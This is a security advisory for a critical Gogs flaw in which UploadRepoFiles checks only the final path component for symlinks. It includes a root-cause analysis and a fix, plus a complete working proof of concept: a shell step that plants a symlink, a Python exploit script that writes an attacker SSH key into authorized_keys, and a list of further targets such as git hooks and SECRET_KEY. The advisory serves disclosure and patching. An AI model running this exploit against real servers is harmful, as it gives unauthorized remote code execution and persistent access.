# [C] Gogs: UploadRepoFiles writes outside repo working tree via committed parent sym

## Summary
Severity: Critical
Advisory: GHSA-89mr-xqfv-758m
CVE: CVE-2026-52811
CWE: CWE-22, CWE-59, CWE-61
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-89mr-xqfv-758m
Type: github-advisory

## Affected
- Go: `gogs.io/gogs` — affected >=0 <0.14.3

## Details
Summary

`(*Repository).UploadRepoFiles` checks for symlinks only on the **leaf** of the upload target (`osx.IsSymlink(targetPath)`). The siblings `UpdateRepoFile`, `DeleteRepoFile`, and `GetDiffPreview` use `hasSymlinkInPath`, which lstats every component — `UploadRepoFiles` is the lone outlier. An attacker with repo-write access plus a multipart upload whose filename contains a literal backslash (preserved by `filepath.Base` on Linux, then converted to `/` by `pathx.Clean`) redirects the write through a previously-committed directory symlink. `iox.CopyFile` opens the destination with `os.Create` (no `O_NOFOLLOW`), so the kernel follows the parent symlink and writes attacker bytes anywhere the gogs UID can write — `~git/.ssh/authorized_keys` → SSH foothold, or `<repo>.git/hooks/post-receive` → next-push RCE.

Windows builds are unaffected: `filepath.Base` treats `\` as a separator (strips the multi-segment trick) and git defaults `core.symlinks=false` at checkout (committed mode-120000 entries become text files, not real symlinks).
Details

The asymmetric check at `internal/database/repo_editor.go:601-612`:

```go
targetPath := path.Join(dirPath, upload.Name)
if osx.IsSymlink(targetPath) {                       // ← LEAF-ONLY
    return errors.Newf("cannot overwrite symbolic link: %s", upload.Name)
}
if err = iox.CopyFile(tmpPath, targetPath); err != nil { ... }
```

vs. `UpdateRepoFile`'s correct walker at `internal/database/repo_editor.go:163`:

```go
if hasSymlinkInPath(localPath, opts.OldTreeName) || hasSymlinkInPath(localPath, opts.NewTreeName) {
    return errors.New("cannot update file with symbolic link in path")
}
```

`hasSymlinkInPath` (`internal/database/repo_editor.go:120-131`) lstats every component; `osx.IsSymlink` (`internal/osx/osx.go:35-41`) is `os.Lstat` mode-bit on the leaf — fine inside the loop, wrong as a single call.

Multi-segment `upload.Name` reaches the loop because: (1) `c.Req.FormFile("file")` returns `*multipart.FileHeader` whose `Filename` is `filepath.Base(filename)` — Linux only treats `/` as separator, so backslashes are preserved; (2) `NewUpload` calls `pathx.Clean` (`internal/pathx/pathx.go:13-16`) which does `strings.ReplaceAll(p, "\\", "/")` — converting backslashes to forward slashes; (3) `upload.Name = "evil/foo"` is persisted and joined into `path.Join(dirPath, upload.Name)`. `iox.CopyFile` at `internal/iox/iox.go:24` uses `os.Create(dst)` = `OpenFile(dst, O_RDWR|O_CREATE|O_TRUNC, ...)` — no `O_NOFOLLOW`, kernel follows symlinks in path. Git's default `core.symlinks=true` on Linux materialises pushed mode-120000 trees as real symlinks at the next `UpdateLocalCopyBranch`.

Suggested fix

1. Replace the leaf check at `repo_editor.go:606` with `hasSymlinkInPath(localPath, path.Join(opts.TreePath, upload.Name))` — the same primitive `UpdateRepoFile` already uses.
2. Walk `opts.TreePath` *before* the `os.MkdirAll(dirPath, ...)` at line 583 so that pre-existing symlinked components don't let `MkdirAll` create directories outside the repo.
3. Switch `iox.CopyFile`'s open to `O_WRONLY|O_CREATE|O_TRUNC|O_NOFOLLOW`, closing the lstat→write TOCTOU at the syscall layer.
4. In `database.NewUpload`, after `pathx.Clean`, refuse `name` containing `/` or `\` outright. Browsers strip path components from file inputs; only attacker tooling sends multi-segment values.

PoC

Tested against gogs HEAD `d7571322` on Ubuntu 24.04. Reproduces on `v0.14.2` (packages renamed `osx`↔`osutil`, `iox.CopyFile`↔`com.Copy`, identical logic).

### Reproduction prerequisites
- gogs ≥ 0.14.0 on Linux/macOS (`runtime.GOOS != "windows"`).
- Two attacker accounts on the gogs instance with write to a repo `attacker/playground` (repo creators are admins of their own repos).
- `git` ≥ 2.x with `core.symlinks=true` (Linux/macOS default).
- Python 3 stdlib only — `curl -F` does NOT trigger the bug because shell quoting + Go's RFC 2045 quoted-pair parsing both consume the backslash; we build the multipart body byte-exactly.

### Why curl alone is unreliable

Bug needs *two* backslash bytes on the wire so Go's `mime.ParseMediaType` quoted-string rule (`\X` → `X`) yields a single `\` in the parsed filename, which `pathx.Clean` then turns into `/`.

| Shell form | Wire bytes | Go parses to | upload.Name | Triggers? |
|---|---|---|---|---|
| `-F "...filename=a\b"`  | `a\b`  | `ab`  | `ab`  | no |
| `-F "...filename=a\\b"` (double quotes) | `a\b`  | `ab`  | `ab`  | no |
| `-F '...filename=a\\b'` (single quotes) | `a\\b` | `a\b` | `a/b` | **yes** |

The Python below removes the ambiguity.

### Step 1 — plant the directory symlink

```sh
git clone https://attacker:attacker_password@gogs.example/attacker/playground
cd playground
ln -s /home/git/.ssh hijack
git add hijack && git commit -m 'docs link' && git push origin main
cd ..
```

Bare repo now contains a mode-120000 entry for `hijack`. Next `UpdateLocalCopyBranch` materialises `<conf.AppDataPath>/tmp/local-r/<repoID>/hijack → /home/git/.ssh`.

### Step 2 — upload + commit

Save as `poc.py`:

```python
#!/usr/bin/env python3
"""PoC for gogs UploadRepoFiles parent-symlink → arbitrary file write."""
import http.client, ssl, json, re, urllib.parse
from http.cookies import SimpleCookie

GOGS_HOST  = 'gogs.example'
USERNAME   = 'attacker'
PASSWORD   = 'attacker_password'
REPO_OWNER = 'attacker'
REPO_NAME  = 'playground'
BRANCH     = 'main'
PUBKEY     = 'ssh-ed25519 AAAA...attacker_pubkey... attacker@laptop\n'

ctx = ssl.create_default_context()    # set to None for plain HTTP / port 3000
def conn():
    if ctx is None:
        return http.client.HTTPConnection(GOGS_HOST, 3000)
    return http.client.HTTPSConnection(GOGS_HOST, 443, context=ctx)

cookies = {}
def update_cookies(resp):
    for hdr in resp.msg.get_all('Set-Cookie') or []:
        for name, morsel in SimpleCookie(hdr).items():
            cookies[name] = morsel.value
def cookie_header():
    return '; '.join(f'{k}={v}' for k, v in cookies.items())
def get_csrf(html):
    return re.search(r'name="_csrf"\s+(?:value|content)="([^"]+)"', html).group(1)

# 1. GET /user/login → session cookie + CSRF
c = conn(); c.request('GET', '/user/login')
r = c.getresponse(); update_cookies(r)
csrf_token = get_csrf(r.read().decode())

# 2. Submit credentials
c = conn()
c.request('POST', '/user/login',
    body=urllib.parse.urlencode({'_csrf': csrf_token, 'user_name': USERNAME, 'password': PASSWORD}),
    headers={'Content-Type': 'application/x-www-form-urlencoded',
             'Cookie': cookie_header(), 'X-CSRF-Token': csrf_token})
r = c.getresponse(); r.read(); update_cookies(r)
assert r.status in (302, 303), f'login failed: {r.status}'

# 3. Refresh CSRF for the logged-in session
c = conn()
c.request('GET', f'/{REPO_OWNER}/{REPO_NAME}', headers={'Cookie': cookie_header()})
r = c.getresponse(); html = r.read().decode(); update_cookies(r)
csrf_token = get_csrf(html)

# 4. Hand-built multipart with literal "\\" (two backslash bytes) in filename.
#    Wire form: filename="hijack\\authorized_keys"
boundary = '----poc-' + 'x' * 16
filename_on_wire = r'hijack\\authorized_keys'   # 23 chars, 2 of them backslashes
body = (
    f'--{boundary}\r\n'
    f'Content-Disposition: form-data; name="file"; filename="{filename_on_wire}"\r\n'
    f'Content-Type: text/plain\r\n\r\n{PUBKEY}\r\n--{boundary}--\r\n'
).encode()
c = conn()
c.request('POST', f'/{REPO_OWNER}/{REPO_NAME}/upload-file', body=body, headers={
    'Content-Type': f'multipart/form-data; boundary={boundary}',
    'Cookie': cookie_header(), 'X-CSRF-Token': csrf_token,
})
r = c.getresponse(); upload_resp = r.read().decode()
print('upload status:', r.status, 'body:', upload_resp)
uuid = json.loads(upload_resp)['uuid']

# 5. Commit the uploaded file at the repo root.
c = conn()
c.request('POST', f'/{REPO_OWNER}/{REPO_NAME}/_upload/{BRANCH}/',
    body=urllib.parse.urlencode({
        '_csrf': csrf_token, 'tree_path': '', 'commit_summary': 'docs link',
        'commit_choice': 'direct', 'files': uuid,
    }),
    headers={'Content-Type': 'application/x-www-form-urlencoded',
             'Cookie': cookie_header(), 'X-CSRF-Token': csrf_token})
r = c.getresponse(); r.read()
print('commit status:', r.status)
```

```sh
python3 poc.py
# upload status: 200 body: {"uuid":"<UUID>"}
# commit status: 302
```

### Step 3 — confirm and use the foothold

```sh
sudo cat /home/git/.ssh/authorized_keys           # operator's view
# → ssh-ed25519 AAAA...attacker_pubkey... attacker@laptop

ssh -i ~/.ssh/id_ed25519 git@gogs.example         # attacker's view
# → shell as the gogs runtime UID
```

### Server-side trace

```
multipart wire bytes:  filename="hijack\\authorized_keys"
mime.ParseMediaType    → "hijack\authorized_keys"           (quoted-pair: \\ → \)
filepath.Base          → "hijack\authorized_keys"           (Linux: only / is a separator)
pathx.Clean            → "hijack/authorized_keys"           (\\ → /, then path.Clean)

UploadRepoFiles:
  targetPath = <local-r>/<repoID>/hijack/authorized_keys
             = /home/git/.ssh/authorized_keys               (parent symlink resolved)
  osx.IsSymlink(targetPath) = false                         (leaf doesn't exist as a symlink)
  iox.CopyFile → os.Create → OpenFile WITHOUT O_NOFOLLOW    (follows the parent symlink)
```

### Other reachable targets (same primitive)

| Symlink target | Effect on next event |
|---|---|
| `/home/git/.ssh` | SSH key implant → shell as gogs UID |
| `<RepoRoot>/<owner>/<repo>.git/hooks` | Hook overwrite → arbitrary code on next push |
| `<RepoRoot>/<owner>/<repo>.git` | `core.fsmonitor=<cmd>` in `config` → exec on next git op |
| `~git/custom/conf` | Modify `app.ini` (`SCRIPT_TYPE`, `INSTALL_LOCK`, `SECRET_KEY`) on restart |
| Path of the sqlite DB file | DoS or admin-row replant |

### Independent confirmation against the source

```sh
git clone https://github.com/gogs/gogs.git && cd gogs
git checkout d7571322
diff <(sed -n '160,170p' internal/database/repo_editor.go) \
     <(sed -n '601,615p' internal/database/repo_editor.go)
# Confirm: line 163 calls hasSymlinkInPath; line 606 calls osx.IsSymlink (leaf only)
sed -n '13,16p' internal/pathx/pathx.go
# Confirm: pathx.Clean does ReplaceAll("\\", "/")
```

Impact

- **Authenticated RCE** as the gogs runtime UID from one repo write. Chain: plant symlink (one git push) → upload with crafted filename → commit → write to `~git/.ssh/authorized_keys` → ssh in.
- Lateral targets: gogs sqlite DB (rewrite admin row), bare-repo hook scripts (run on next push by *any* user with `GOGS_AUTH_USER_*` env populated), `app.ini` `SECRET_KEY` (forges session cookies, decrypts stored 2FA secrets and mirror credentials).
- Persistent: symlink and key both survive restart; removing the attacker's repo access does not undo the SSH foothold.
- Linux/macOS only. Windows hosts are unaffected for two independent reasons (`filepath.Base` separator handling, git's `core.symlinks` default).

## References
- https://github.com/gogs/gogs/security/advisories/GHSA-89mr-xqfv-758m
- https://nvd.nist.gov/vuln/detail/CVE-2026-52811
- https://github.com/gogs/gogs/pull/8332
- https://github.com/gogs/gogs/commit/04cb8afbb01d855454e59977a1cdbf522ea1db31
- https://github.com/gogs/gogs
- https://github.com/gogs/gogs/releases/tag/v0.14.3
